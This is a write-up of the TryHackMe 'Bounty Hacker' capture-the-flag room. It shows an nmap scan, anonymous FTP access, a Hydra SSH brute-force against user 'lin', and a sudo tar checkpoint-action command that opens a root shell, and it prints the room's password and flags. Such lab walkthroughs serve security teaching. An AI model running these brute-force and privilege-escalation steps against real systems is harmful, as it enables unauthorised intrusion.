## Bounty Hacker — TryHackMe Writeup

<img width="1901" height="366" alt="Screenshot 2025-11-20 232210" src="https://github.com/user-attachments/assets/a03ad998-8eb1-4d3e-9ac0-e5018132ea2a" />

> they re saying, 
> "You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!"

They threw the challenge. We’re not here to ask questions — we’re here to break in, break out, and show ‘em exactly **who we are** . Let’s do this.

----

Once the machine boots and we get our target IP, first task? Port scanning. Obviously. (Which is asked, tho.)

###  Nmap Scan

```bash
nmap 10.49.170.32
```


<img width="637" height="212" alt="Screenshot 2025-11-20 224619" src="https://github.com/user-attachments/assets/03ccc4a8-4c12-4002-a02f-1fdbc80e772e" />



**Results:**

- 21/tcp → FTP  
- 22/tcp → SSH  
- 80/tcp → HTTP

Let’s try FTP first.

---

###  FTP Access

```bash
ftp 10.49.170.32
```


<img width="579" height="310" alt="Screenshot 2025-11-20 231913" src="https://github.com/user-attachments/assets/c4dc9367-5bee-4376-8bb2-c0a379b00b13" />


Logged in as `anonymous` — success. Found two files:

- `locks.txt`  
- `task.txt`

lets get them on local machine first.
<img width="947" height="237" alt="Screenshot 2025-11-20 232127" src="https://github.com/user-attachments/assets/ea642e13-0f22-4235-98ea-a3c34a2198de" />


Downloaded both using `mget`.

---

###  Recon from Files


**locks.txt** looks like :

<img width="286" height="470" alt="Screenshot 2025-11-20 224825" src="https://github.com/user-attachments/assets/b9637b69-fe8b-472d-b85c-8e9e6a41ba1a" />


clearly a password list. Looks like brute-force material.


**task.txt**  says:


<img width="376" height="113" alt="Screenshot 2025-11-20 224818" src="https://github.com/user-attachments/assets/248c977c-188f-4a45-97eb-a3cb8445dde9" />



```
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.
-lin
```

So the user is `lin`.

---

###  Challenge Questions

- Who wrote the task list? → `lin`  
- What service can you brute-force with the text file? → `SSH`

Before jumping to brute-force, I checked port 80. Just a basic web page with some Cowboy Bebop flavor text. Nothing useful.


<img width="1920" height="1080" alt="Screenshot_2025-11-20_22_49_16" src="https://github.com/user-attachments/assets/82fda55f-3221-4d45-8bec-91a08aa72b82" />


---

###  Brute-Forcing SSH

Used Hydra to fuzz passwords for user `lin`:

```bash
hydra -l lin -P locks.txt ssh://10.49.170.32
```


<img width="835" height="248" alt="Screenshot 2025-11-20 225447" src="https://github.com/user-attachments/assets/48c085b7-d47e-4b79-9050-44d6b06d8ab3" />


**Hit:**  
`lin : RedDr4gonSynd1cat3`

Another challenge question down:

- What is the user’s password? → `RedDr4gonSynd1cat3`

---

###  SSH Access

```bash
ssh lin@10.49.170.32
```

<img width="649" height="504" alt="Screenshot 2025-11-20 225641" src="https://github.com/user-attachments/assets/6baa8749-bd80-41ca-b410-6dea49c28465" />


Logged in successfully.Now lets get out first flag !

```bash
cat user.txt
```


<img width="417" height="104" alt="Screenshot 2025-11-20 225648" src="https://github.com/user-attachments/assets/b7e0ad5e-ba8b-4600-be20-05c3727fae74" />


**User Flag:** `THM{CR1M3_SyNd1C4T3}`

---

Now for root flag we have to do Privilege Escalation.
I Checked sudo permissions first and found something sus! :
```
sudo -l
```


<img width="958" height="118" alt="Screenshot 2025-11-20 225852" src="https://github.com/user-attachments/assets/5df016c4-1e28-45e6-a0f0-68e834564652" />


we got:
(root) /bin/tar

I went straight to GTFObins. And found this:
```
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```


<img width="1145" height="359" alt="Screenshot 2025-11-20 230043" src="https://github.com/user-attachments/assets/65c2937e-1cc9-4045-9c4d-6c34a46487a6" />


Ran it. Boom — root shell.


<img width="908" height="67" alt="Screenshot 2025-11-20 230125" src="https://github.com/user-attachments/assets/f7062ab6-fe70-41d2-b70c-09c78838aea0" />

ALmost there...

<img width="262" height="111" alt="Screenshot 2025-11-20 230133" src="https://github.com/user-attachments/assets/d2e9379f-4559-477c-863a-9c1bbfa9abd6" />


Root Flag: THM{80UN7Y_h4cK3r}

Challenge Solved !!

> That’s a wrap. FTP gave us the keys, Hydra cracked the gate, and tar handed us root. They wanted proof — we gave them a full system compromise.
> Bounty claimed. Status: Elite.

